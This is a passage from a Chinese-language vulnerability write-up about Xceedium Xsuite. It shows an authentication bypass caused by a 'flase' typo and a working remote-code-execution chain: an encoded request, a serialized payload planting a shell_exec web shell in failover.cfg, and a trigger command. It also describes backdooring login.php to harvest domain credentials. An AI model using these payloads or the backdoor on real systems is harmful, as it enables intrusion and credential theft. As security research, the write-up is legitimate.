            $row = trim($row);
            if ($row == "") {
                continue;
            }
            $row_sp = preg_split("/=/", $row);
            if ($row_sp[0] == "SHARED_KEY") {
                if ($shared_key == $row_sp[1])       //4
                    return true;
                }
            }
        } else {
        return false;
        }
    }
此功能执行以下操作：
  1. 检查传递给它的密钥长度是否为32个字符;
  2. 检查传递给它的键是否是空字符串;
  3. 逐行读取`failover.cfg`文件;
  4. 检查提供的共享密钥是否与`failover.cfg`中的共享密钥匹配。
因此，我们可以先从`/var/uag/config/failover.cfg`文件中提取共享密钥，将其添加到请求中。将构造的php代码base64编码、序列化、写入`failover.cfg`中，最后调用`linkDB()`、`eval()`来执行代码，也就是RCE。在阅读了`failover.cfg`的内容之后，我被以下内容感动：
    /var/uag/config/failover.cfg
    CLUSTER_MEMBERS=
    ACTIVE_IFACE=
    SHARED_KEY=
    STATUS=
    MY_INDEX=
    CLUSTER_STATUS=
    CLUSTER_IP=
    CLUSTER_NAT_IP=
    CLUSTER_FQDN=
文件是空的！
我们无法窃取现有密钥因为它压根没有被配置。再次失败后，我将注意力转回`checkSharedKey()`功能。
`checkSharedKey()`函数做的第一件事是检查提供的密钥的长度。这意味着我们不能简单地传递一个空白键来通过检查，这回可能GG了。然而，过了一段时间，我注意到一个被忽略了的微妙问题。你看见了吗？
    /var/www/htdocs/uag/functions/activeActiveCmd.php
    function checkSharedKey($shared_key) {
        if (strlen($shared_key) != 32) {
            return false;
        }
        if (trim($shared_key) == "") {
            return flase;               
        }
    …
    }
由于笔误，当提供一个长度为32字符但在调用`trim()`后为空的共享密钥时，该函数将返回“flase”。注意，返回得是字符串“flase”而不是布尔值FALSE。哈哈，字符串“flase”的布尔值为TRUE，因此密钥检查将成功，由此可以绕过检查。
检索PHP手册的的`trim()`函数，我看到以下内容：
理论上将，我们可以使用32个空格、制表符、换行符、回车符、空字节或垂直制表符绕过检查实现RCE。这全都靠有人在敲“false”这个词时签错了两个字母！
为了测试我们的想法，我提取了代码的相关部分，并编写一个与Xsuite代码相同逻辑的小脚本。
接着我测试了几条输入：
正如所料，传递一个32字符的随机字符串会返回FALSE，不会绕过检查。现在尝试回车/空字节等字符：
如预期的那样，由32个回车符、空字节等组成的字符串将绕过`checkSharedKey()`函数。现在可以绕过授权检查并实现RCE了。由于此利用程序需要很多步骤，而且可能出现大量错误，因此我决定再次摘取相关代码并在本地测试。
## 利用
经过一段时间的本地测试后，我将利用提炼成以下几步：
  1. 利用`$shared_key`参数绕过检查，并向`failover.cfg`文件注入恶意代码：
    ajax_cmd.php?cmd=ACTACT&cmdtype=PUTCONFS&shared_key=%0D%0D%0D%0D%0D%0D%0D%0D%0D%0D%0D%0D%0D%0D%0D%0D%0D%0D%0D%0D%0D%0D%0D%0D%0D%0D%0D%0D%0D%0D%0D%0D&post=YTo2OntzOjExOiJyYWRpb19pZmFjZSI7czo1OiJpZmFjZSI7czoxNToiY2x1c3Rlcl9tZW1iZXJzIjthOjE6e2k6MDtzOjk6IjEyNy4wLjAuMSI7fXM6MTM6InR4X3NoYXJlZF9rZXkiO3M6MzI6IkFBQUFCQkJCQ0NDQ0RERFhYQUFBQkJCQkNDQ0NEREREIjtzOjY6InN0YXR1cyI7czozOiJPRkYiO3M6MTI6ImNsdXN0ZXJfZnFkbiI7czo1NToidGVzdC5kb21haW4iO2VjaG8gc2hlbGxfZXhlYyh1cmxkZWNvZGUoJF9QT1NUWydjJ10pKTsvLyI7czoxMDoiY2x1c3Rlcl9pcCI7czo5OiIxMjcuMC4wLjEiO30=
解码post参数，得到以下序列化过的攻击载荷：
    a:6:{s:11:"radio_iface";s:5:"iface";s:15:"cluster_members";a:1:{i:0;s:9:"127.0.0.1";}s:13:"tx_shared_key";s:32:"AAAABBBBCCCCDDDXXAAABBBBCCCCDDDD";s:6:"status";s:3:"OFF";s:12:"cluster_fqdn";s:55:"test.domain";echo shell_exec(urldecode($_POST['c']));//";s:10:"cluster_ip";s:9:"127.0.0.1";}
它对应一个PHP的表单对象：
    $data = array();
    $data['radio_iface'] = "iface";
    $data['cluster_members'] = array("127.0.0.1");
    $data['tx_shared_key'] = "AAAABBBBCCCCDDDXXAAABBBBCCCCDDDD";
    $data['status'] = "OFF";
    $data['cluster_fqdn'] = "test.domain";echo shell_exec(urldecode($_POST['c']));//";s:10:"cluster_ip";s:9:"127.0.0.1";}
  1. 利用`read_sessionlog.php`中的任意文件读取漏洞读回内容，来查看配置文件是否被投毒：
  1. 调用`linkDB()`函数以使`eval()`函数评估 `failover.cfg` 文件的内容，从而执行命令。
    POST /ajax_cmd.php?cmd=get_applet_params&sess_id=1&host_id=1&task_id=1
    c=whoami
## 结论
在我们第一次发现Xceedium设备时，感觉自己挖到了宝。一个明显过时的设备，加上一个公开可用的漏洞，RCE仿佛触手可及。但情况并非如此，最终攻克的过程也比预期花费了更多的时间和精力。
你若好奇接下来的攻击路线，它大概是这样：在拿下设备后，我们很快发现了一种获取设备root权限的方法。由于Xceedium
Xsuite（软件功能：身份和访问管理）的性质，这台设备每天要验证数百名用户。使用root权限，我们只需在login.php中做个后门就可以窃取数百个域登录凭据。有趣的是，我们捕获到一些域/企业管理员的明文凭据。这使我们可以登录全球多个域主机。当然，红队的目标不是获得域管理员权限，但它依然很有帮助。
:)
如前所述，我很抱歉没有更多的屏幕截图显示实际的攻击，但我也不想冒险得罪客户。此外，在挖掘过程中我也从未公开漏洞。最后，我要说在披露过程中与Xceedium（现在的CA
Technologies）合作是一种享受，这话好假。